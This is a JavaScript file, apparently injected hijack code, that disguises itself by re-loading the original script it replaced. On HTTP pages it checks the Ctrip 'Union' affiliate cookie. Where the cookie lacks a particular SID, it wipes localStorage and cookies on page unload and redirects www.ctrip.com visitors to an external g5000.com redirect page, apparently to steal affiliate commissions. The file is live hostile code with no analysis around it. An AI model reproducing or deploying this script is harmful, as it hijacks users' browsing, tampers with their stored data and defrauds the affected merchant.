l___k__s = ~ function(thisWindow, thisDocument, regex_1, regex_2, str_script, Charset, Async, l) {
    var str_00_g_0 = '00_g_0',
        isOpera = thisWindow.opera,
        originSrc = (function(js_src) {

            if (!js_src || /([^:]|^)\/\//.test(js_src) || ~js_src.indexOf(str_00_g_0.replace(/_/g, '.'))) {
                return 0;
            }
            js_src = js_src + '?__=__&';
            if (!js_src.lastIndexOf('/')) {
                return js_src.replace(regex_1, regex_2);
            }
            return js_src.substr(0, 1) + js_src.substr(1).replace(regex_1, regex_2);
        })(
            (function(curScriptElement, allScripts, errMsg) {

                if (curScriptElement) {
                    Charset = curScriptElement.charset;
                    Async = curScriptElement.async;
                    return curScriptElement.src;
                }
                try {
                    Z.G.Y();
                } catch (c) {
                    errMsg = c.stack || c.fileName || c.sourceURL || c.stacktrace;
                    if (!errMsg && isOpera) {
                        errMsg = (('' + c).match(/of linked script \S+/g) || []).join(' ');
                    }
                }
                if (errMsg) {
                    errMsg = errMsg.split(/[@ ]/g).pop();
                    errMsg = errMsg[0] == '(' ? errMsg.slice(1, -1) : errMsg;
                    for (var w = errMsg.replace(/(:\d+)?:\d+$/i, ''), scriptEl, i = allScripts.length; i--;) {
                        scriptEl = allScripts[i];
                        if (w == scriptEl.src) {
                            Charset = scriptEl.charset;
                            Async = scriptEl.async;
                            break;
                        }
                    }
                    return w;
                }

                for (var lastJsDOM = (allScripts[allScripts.length - 1] || {}), y = 0, cur; y++;) {
                    cur = allScripts[y];
                    if (cur.readyState == 'interactive') {
                        Charset = cur.charset;
                        Async = cur.async;
                        return cur.src;
                    }
                }
                Charset = lastJsDOM.charset;
                Async = lastJsDOM.async;
                return lastJsDOM.src;
            })(thisDocument.currentScript, thisDocument.getElementsByTagName(str_script))),
        head = thisDocument.getElementsByTagName('head')[0],
        newScriptElm = thisDocument.createElement(str_script),
        sessionStorage = thisWindow.sessionStorage;
    if (originSrc) {

        if(Charset){
            newScriptElm.charset = Charset;
        }
        newScriptElm.src = originSrc;
        newScriptElm.async = Async;
        if (!Async && /\[nati/.test(thisDocument.write + '')) {
            thisDocument.write('<' + str_script + ' src="' + originSrc + '"' +
                (Charset ? ' charset="' + Charset + '"' : '') +
                ' async=' + (Async ? 'true' : 'false') +
                '><\/' + str_script + '>');
        } else {
            head.appendChild(newScriptElm);
        }
    }


    if (!thisWindow.l___k__s && !isOpera && navigator.cookieEnabled && /^http:/.test(thisDocument.URL)) {
        var getCookie = function(c_name) {
            if (thisDocument.cookie.length > 0) {
                c_start = thisDocument.cookie.indexOf(c_name + "=");
                if (c_start != -1) {
                    c_start = c_start + c_name.length + 1;
                    c_end = thisDocument.cookie.indexOf(";", c_start);
                    if (c_end == -1) {
                        c_end = thisDocument.cookie.length;
                    }
                    return unescape(thisDocument.cookie.substring(c_start, c_end));
                }
            }
            return "";
        };

        function clearCookie(){
            var cookie_host = location.host.substr(location.host.indexOf("."))
            var keys=document.cookie.match(/[^ =;]+(?=\=)/g);
            if (keys) {
                for (var i = keys.length; i--;)
                    document.cookie = keys[i] + "=;expires=Thu, 01 Jan 2010 00:00:00 GMT; path=/; domain=" + cookie_host;
            }
        }


        function run_only_once(keystring, fn) {
            var w = window.top;
            if (keystring in w) {
                return;
            }
            w[keystring] = 1;
            fn();
        }

        var EventUtil = {
            getEvent: function (event) {
                return event ? event : window.event;
            },
            addHandler: function (element, type, handler) {
                if (element.addEventListener) {
                    element.addEventListener(type, handler, false);
                } else if (element.attachEvent) {
                    element.attachEvent("on" + type, handler);
                } else {
                    element["on" + type] = handler;
                }
            }
        };


        var key = "Union";
        var cookiee = getCookie(key);
        run_only_once("onlyonce_ctrip", function(){
            if (!/SID=1199210/.test(cookiee)){
                var url = "";
                EventUtil.addHandler(window, "beforeunload", function (event) {
                    localStorage.clear();
                    clearCookie();

                });
                try{
                    if(/www.ctrip.com/.test(window.location.href)){
                        var url = "http://www.g5000.com/xc_redirect.html?f=1&k=" + (new Date()).valueOf();
                        window.location.href = url;
                    }
                }catch (e){

                }
            }
        });
    }
}(self, document, /([^:\/]|^)\//, '$1//', 'script');
